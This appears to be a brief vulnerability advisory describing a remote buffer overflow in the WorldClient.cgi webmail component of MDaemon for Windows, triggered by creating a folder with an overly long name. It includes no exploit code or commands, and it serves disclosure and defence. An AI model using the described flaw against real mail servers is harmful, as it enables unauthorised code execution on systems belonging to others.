MDaemon is an integrated mail transport agent, webmail, and mail anti-virus package. It is available for Microsoft Windows operating systems.

It may be possible for a remote user to take advantage of a buffer overflow in the MDaemon software package. The WorldClient.cgi program packaged with MDaemon does not properly check bounds on user-supplied data. During the process of creating a folder with a long name, it is possible to exploit a buffer overflow in the CGI that could result in the overwriting of process memory, and execution of attacker-supplied instructions.
